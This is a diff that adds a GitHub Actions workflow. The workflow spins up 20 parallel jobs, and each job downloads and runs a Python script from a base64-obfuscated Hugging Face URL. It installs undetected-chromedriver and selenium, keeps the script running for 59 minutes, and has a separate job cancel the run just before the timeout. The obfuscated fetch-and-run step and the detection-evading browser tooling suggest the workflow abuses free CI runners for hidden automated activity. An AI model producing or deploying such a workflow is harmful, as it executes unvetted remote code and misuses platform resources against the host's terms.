@@ -1,0 +1,106 @@
+name: Cobalt Nexus Vanguard Chain
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: cobalt-vanguard-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # السيادي الأوحد: يُطلق إشارة الإنهاء عند علامة 59 دقيقة بالضبط
+  # =================================================================
+  cobalt-overlord:
+    name: "Cobalt Overlord"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: Elevate Overlord Throne
+        run: |
+          echo "[OVERLORD] Cobalt overlord enthroned. Watch raised at the 59-minute line."
+          echo "[OVERLORD] Run insignia recorded: ${{ github.run_id }}"
+          
+          # فترة الاستنفار المحددة (3540 ثانية = 59 دقيقة)
+          sleep 3540
+          
+          echo "[OVERLORD] Line surpassed! Deploying overlord decree..."
+          
+          # نشر أمر الإلغاء عبر GitHub API
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[OVERLORD] Decree deployed. Every active and queued vanguard will be scattered."
+
+  # =================================================================
+  # طليعة النيكس المتوازية: تشييد وتشغيل عُقد الطليعة
+  # =================================================================
+  vanguard-chain:
+    name: "VanguardNode-${{ matrix.vanguard_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        vanguard_id: [1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320]
+
+    steps:
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المحطة ⟨Ⅰ⟩: بناء الحجر الأساس
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Build Cornerstone
+        run: |
+          echo "[CORNERSTONE] Building cornerstone for VanguardNode-${{ matrix.vanguard_id }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المحطة ⟨Ⅱ⟩: التقاط حزمة التشغيل
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Capture Runner Bundle
+        run: |
+          echo "[CAPTURE] Capturing vanguard_agent.py from assigned node link..."
+          SOURCE_LINK=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$SOURCE_LINK" -o vanguard_agent.py
+          echo "[CAPTURE] Runner bundle captured."
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المحطة ⟨Ⅲ⟩: تعبئة الطرود المرافقة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Pack Companion Crates
+        run: |
+          echo "[PACK] Packing companion crates..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المحطة ⟨Ⅳ⟩: التنفيذ المقيّد بـ 59 دقيقة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Cast Vanguard Wave
+        run: |
+          echo ">> Casting VanguardNode-${{ matrix.vanguard_id }} wave..."
+          
+          # تشغيل العملية في الخلفية
+          python3 vanguard_agent.py &
+          VANGUARD_PID=$!
+          
+          echo ">> Vanguard wave cast. Border: 59 minutes (3540s)."
+          
+          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
+          sleep 3540
+          
+          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
+          if kill -0 $VANGUARD_PID 2>/dev/null; then
+            echo ">> Border crossed! Scattering wave..."
+            kill -9 $VANGUARD_PID
+            echo ">> Wave scattered by border keeper."
+          else
+            echo ">> Wave receded within border."
+          fi
